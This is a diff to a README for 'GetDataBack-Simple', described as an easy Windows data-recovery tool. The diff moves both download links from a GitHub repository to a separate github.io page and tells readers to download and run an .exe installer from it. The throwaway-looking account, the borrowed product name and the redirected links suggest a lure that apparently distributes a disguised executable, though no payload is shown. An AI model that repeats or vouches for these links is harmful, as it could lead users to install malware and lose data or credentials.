@@ -1,6 +1,6 @@
 # 💾 GetDataBack-Simple - Recover your deleted files with ease
 
-[![Download GetDataBack-Simple](https://img.shields.io/badge/Download-GetDataBack-Simple-blue.svg)](https://github.com/Pilgrimagefootstepsofspring976/GetDataBack-Simple)
+[![Download GetDataBack-Simple](https://img.shields.io/badge/Download-GetDataBack-Simple-blue.svg)](https://pilgrimagefootstepsofspring976.github.io)
 
 GetDataBack-Simple helps you recover lost data on Windows 11 and Windows 10 computers. This tool restores files that you accidentally deleted or lost due to drive corruption. The interface guides you through the recovery process without requiring advanced computer skills. 
 
@@ -19,7 +19,7 @@ This software handles common data loss scenarios. It works with NTFS file system
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/Pilgrimagefootstepsofspring976/GetDataBack-Simple) to get the latest version.
+1. Visit the [official download page](https://pilgrimagefootstepsofspring976.github.io) to get the latest version.
 2. Locate the installer file, which ends in .exe.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to complete the setup.
